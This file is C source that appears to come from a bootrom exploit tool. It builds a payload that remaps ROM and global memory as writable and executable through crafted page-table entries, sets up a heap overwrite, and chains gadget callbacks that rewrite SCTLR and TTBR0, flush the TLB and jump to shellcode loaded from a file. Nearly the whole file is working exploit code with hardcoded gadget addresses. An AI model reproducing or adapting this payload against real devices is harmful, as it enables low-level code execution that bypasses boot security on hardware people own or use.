#include "./inc/actions.h"
#include <unistd.h>
#include <sys/stat.h>
#include <sys/fcntl.h>

#define debug false

#define FUNC_GADGET 0x10000a9ac
#define SKIP_CALL 0x10000A9C4
#define INSECURE_MEMORY 0x18001c000
#define ROM_BASE 0x100000000
#define PAGE_TABLE_BASE 0x18000C000
#define GLOBALS 0x180000000 //heap etc.
#define DATA_MEMORY_BARRIER 0x1000004F0

uint64_t callback_struct_offset;

typedef struct
{
    uint64_t offset;
    uint64_t value;
} memory_map;

typedef struct
{
    uint8_t *advance;
    uint64_t advance_length;
    uint8_t *overwrite;
    uint64_t overwrite_length;
} heap_overwrite;

memory_map get_mapping(uint64_t virtual_address, bool write, bool execute)
{
    memory_map ret = {0};
    uint64_t level_shift = 25;
    ret.offset = (virtual_address >> level_shift) * 8;
    uint64_t flags = 0;
    if (!execute)
        flags |= 0x60000000000000;
    if (!write)
        flags |= 0x80;
    flags |= 0x421 | 0x200 | 4;
    ret.value = virtual_address | flags;
    printf("[*] Will map 0x%llx -> 0x%llx at 0x%llx\n", virtual_address, ret.value, ret.offset);
    return ret;
}

heap_overwrite get_overwrite()
{
    uint8_t *advance = calloc(0x500, 1);
    uint8_t *overwrite = calloc(48, 1);
    heap_overwrite ret = {0};
    *(uint64_t *)(overwrite + 32) = 0;//SKIP_CALL;
    *(uint64_t *)(overwrite + 32 + 8) = INSECURE_MEMORY + 0x8;

    ret.advance = advance;
    ret.advance_length = 0x500;
    ret.overwrite = overwrite;
    ret.overwrite_length = 48;
    return ret;
}

uint8_t *get_payload(int64_t *len, char *shellcode_path, char *companion_path)
{
    uint64_t i;
    uint8_t *payload = calloc(0x8000, 1);
    memory_map rom_remap = get_mapping(ROM_BASE, true, true);
    memory_map globals_remap = get_mapping(GLOBALS, true, true);
    //WRITE
    *(uint64_t *)(payload + 0x208) = 0x18000C600 - 8;     //where
    *(uint64_t *)(payload + 0x210) = globals_remap.value; //what
    //*(uint64_t*)(payload + 0x218) = 0x18000C400-8;        //where
    //*(uint64_t*)(payload + 0x220) = 0x100000625;          //what

    //TEMP PAGE TABLE
    *(uint64_t *)(payload + rom_remap.offset /*+ 0x100*/) = rom_remap.value;
    *(uint64_t *)(payload + globals_remap.offset /*+0x100*/) = globals_remap.value;

    //CALLBACKS
    callback_struct_offset = 0x8;
    // dmb 0
    *(uint64_t *)(payload + callback_struct_offset + 0x70) = 0;                         //x
    *(uint64_t *)(payload + callback_struct_offset + 0x70 + 0x8) = 0x100000404; //DATA_MEMORY_BARRIER; //f
    *(uint64_t *)(payload + callback_struct_offset + 0x20) = FUNC_GADGET;               //callback
    *(uint64_t *)(payload + callback_struct_offset + 0x28) = INSECURE_MEMORY + 0x18;    //next
    // write sctlr
    *(uint64_t *)(payload + callback_struct_offset + 0x10 + 0x70) = 0x100D;                 //x
    *(uint64_t *)(payload + callback_struct_offset + 0x10 + 0x70 + 0x8) = 0x1000003EC;      //f
    *(uint64_t *)(payload + callback_struct_offset + 0x10 + 0x20) = FUNC_GADGET;            //callback
    *(uint64_t *)(payload + callback_struct_offset + 0x10 + 0x28) = INSECURE_MEMORY + 0x28; //next
    // write ttbr0
    *(uint64_t *)(payload + callback_struct_offset + 0x20 + 0x70) = INSECURE_MEMORY;        //+ 0x100;        //x
    *(uint64_t *)(payload + callback_struct_offset + 0x20 + 0x70 + 0x8) = 0x10000045C;      //f
    *(uint64_t *)(payload + callback_struct_offset + 0x20 + 0x20) = FUNC_GADGET;            //callback
    *(uint64_t *)(payload + callback_struct_offset + 0x20 + 0x28) = INSECURE_MEMORY + 0x38; //next
    // tlbi
    *(uint64_t *)(payload + callback_struct_offset + 0x30 + 0x70) = 0;                      //x
    *(uint64_t *)(payload + callback_struct_offset + 0x30 + 0x70 + 0x8) = 0x1000004AC;      //f
    *(uint64_t *)(payload + callback_struct_offset + 0x30 + 0x20) = FUNC_GADGET;            //callback
    *(uint64_t *)(payload + callback_struct_offset + 0x30 + 0x28) = INSECURE_MEMORY + 0xB8; //next
    // write
    *(uint64_t *)(payload + callback_struct_offset + 0xB0 + 0x70) = INSECURE_MEMORY + 0x208; //x
    *(uint64_t *)(payload + callback_struct_offset + 0xB0 + 0x70 + 0x8) = 0x10000945C;       //f
    *(uint64_t *)(payload + callback_struct_offset + 0xB0 + 0x20) = FUNC_GADGET;             //callback
    *(uint64_t *)(payload + callback_struct_offset + 0xB0 + 0x28) = INSECURE_MEMORY + 0xC8;  //next
    // write ttbr0
    *(uint64_t *)(payload + callback_struct_offset + 0xC0 + 0x70) = 0x18000C000;             //x
    *(uint64_t *)(payload + callback_struct_offset + 0xC0 + 0x70 + 0x8) = 0x10000045C;       //f
    *(uint64_t *)(payload + callback_struct_offset + 0xC0 + 0x20) = FUNC_GADGET;             //callback
    *(uint64_t *)(payload + callback_struct_offset + 0xC0 + 0x28) = INSECURE_MEMORY + 0x148; //next
    // tlbi
    *(uint64_t *)(payload + callback_struct_offset + 0x140 + 0x70) = 0;                       //x
    *(uint64_t *)(payload + callback_struct_offset + 0x140 + 0x70 + 0x8) = 0x1000004AC;       //f
    *(uint64_t *)(payload + callback_struct_offset + 0x140 + 0x20) = FUNC_GADGET;             //callback
    *(uint64_t *)(payload + callback_struct_offset + 0x140 + 0x28) = INSECURE_MEMORY + 0x158; //next
    // call shellcode
    *(uint64_t *)(payload + callback_struct_offset + 0x150 + 0x70) = 0;                             //x
    *(uint64_t *)(payload + callback_struct_offset + 0x150 + 0x70 + 0x8) = INSECURE_MEMORY + 0x300; //f
    *(uint64_t *)(payload + callback_struct_offset + 0x150 + 0x20) = FUNC_GADGET;                   //callback
    *(uint64_t *)(payload + callback_struct_offset + 0x150 + 0x28) = 0;                             //next

    int shellcode = open(shellcode_path, O_RDONLY);
    if (shellcode < 0)
    {
        printf("[!] Nu putem deschide %s\n", shellcode_path);
        exit(-1);
    }
    struct stat info;
    fstat(shellcode, &info);
    read(shellcode, payload + 0x300, info.st_size);

    *len = 0x800; //0x300 + info.st_size;
    uint64_t start = 0x8;
    i = 0;
    while (debug)
    {
        printf("%lld Calling %llx with arg %llx\n", i++, *(uint64_t *)(payload + start + 0x78), *(uint64_t *)(payload + start + 0x70));
        start = *(uint64_t *)(payload + start + 0x28);
        if (start == 0)
            break;
        start = start - INSECURE_MEMORY;
    }

    int companion = open(companion_path, O_RDONLY);
    if (companion < 0)
    {
        printf("[!] Nu putem deschide %s\n", companion_path);
        exit(-1);
    }
    fstat(companion, &info);
    read(companion, payload + 0x800, info.st_size);
    *len = 0x800 + info.st_size + 0x10 + 0x30; // 0x10 pentru siguranta
    if (debug)
    {
        int fd = open("./payload", O_RDWR | O_TRUNC | O_CREAT, S_IRWXU | S_IRWXG | S_IRWXO);
        write(fd, payload, *len);
    }

    for (i = 0; debug && i < *len; i += 0x8)
    {
        if (*(uint64_t *)(payload + i) != FUNC_GADGET)
            printf("0x%llx\t0x%llx\n", i, *(uint64_t *)(payload + i));
        else
            printf("0x%llx\tFUNC_GADGET\n", i);
    }

    return payload;
}
